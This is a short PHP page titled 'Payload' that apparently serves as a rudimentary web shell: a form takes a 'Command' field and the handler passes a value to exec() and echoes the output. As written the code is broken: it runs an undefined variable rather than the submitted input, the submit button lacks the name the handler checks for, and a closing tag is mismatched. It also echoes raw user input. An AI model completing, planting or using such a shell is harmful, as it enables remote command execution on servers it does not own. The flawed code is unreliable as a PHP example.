<!DOCTYPE html>
<html>
      
<head>
    <title>
        Payload
    </title>
</head>
  
<body style="text-align:center;">

    <?php
        if(array_key_exists('cmd_button', $_POST)) {
            butt();
        }
        function butt() {

            echo $_POST["cmd_input"];
            $output = exec($command);

            echo $output;
        }
    ?>

    <form method="post">
        <label for="cmd_input">Command: </label><input type="text" name="cmd_input"><br>
        <input type="submit"/>
    </form>
</head>
  
</html>

